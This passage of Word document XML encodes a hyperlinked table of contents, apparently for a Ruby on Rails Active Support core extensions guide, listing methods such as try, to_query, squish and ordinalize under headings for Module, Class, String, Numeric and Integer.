    <w:p w14:paraId="512144FA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId406" w:anchor="2-3" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>duplicable?</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0460056A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId407" w:anchor="2-4" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>try</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="72BC57C5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId408" w:anchor="2-5" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>class_eval(*args, &amp;block)</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3E801D79" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId409" w:anchor="2-6" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>acts_like?(duck)</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="53F77D01" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId410" w:anchor="2-7" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>to_param</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5883653B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId411" w:anchor="2-8" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>to_query</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="43CF686B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId412" w:anchor="2-9" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>with_options</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="06E59E80" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId413" w:anchor="2-10" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Instance Variables</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="31FE4EDF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId414" w:anchor="2-11" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Silencing Warnings, Streams, and Exceptions</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="04248799" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId415" w:anchor="2-12" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>in?</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0872B01C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId416" w:anchor="3" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve">Extensions to </w:t>
        </w:r>
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Module</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="32DAC623" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId417" w:anchor="3-1" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>alias_method_chain</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0DF00DC0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId418" w:anchor="3-2" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Attributes</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4D4C3AD8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId419" w:anchor="3-3" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Parents</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="007A3DE0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId420" w:anchor="3-4" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Constants</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6CA45FD6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId421" w:anchor="3-5" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Reachable</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="78FD8E0D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId422" w:anchor="3-6" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Anonymous</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="323F7119" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId423" w:anchor="3-7" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Method Delegation</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="46E2A6F8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId424" w:anchor="3-8" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Redefining Methods</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="002C5E9A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId425" w:anchor="4" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve">Extensions to </w:t>
        </w:r>
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Class</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4135D9A4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId426" w:anchor="4-1" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Class Attributes</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="49EB3C0D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId427" w:anchor="4-2" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Class Inheritable Attributes</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="606B8DEC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId428" w:anchor="4-3" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Subclasses &amp; Descendants</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1930705A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId429" w:anchor="5" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve">Extensions to </w:t>
        </w:r>
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>String</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7252E976" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId430" w:anchor="5-1" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Output Safety</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="71D3399E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId431" w:anchor="5-2" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>squish</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4F565603" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId432" w:anchor="5-3" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>truncate</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3E2E956B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId433" w:anchor="5-4" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>inquiry</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1C270C08" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId434" w:anchor="5-5" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Key-based Interpolation</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="21054070" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId435" w:anchor="5-6" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>starts_with?</w:t>
        </w:r>
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve"> and </w:t>
        </w:r>
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>ends_with?</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6185BEA2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId436" w:anchor="5-7" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>strip_heredoc</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="62EF44A9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId437" w:anchor="5-8" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Access</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1029F23F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId438" w:anchor="5-9" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Inflections</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="343F0F1D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId439" w:anchor="string-conversions" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Conversions</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="72339629" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId440" w:anchor="6" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve">Extensions to </w:t>
        </w:r>
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Numeric</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="40149FCD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId441" w:anchor="6-1" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Bytes</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="72434D84" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId442" w:anchor="7" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve">Extensions to </w:t>
        </w:r>
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Integer</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1B01BD30" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId443" w:anchor="7-1" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>multiple_of?</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2CC39435" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId444" w:anchor="7-2" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>ordinal</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="661990D0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId445" w:anchor="7-3" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>ordinalize</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7DD57A6A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
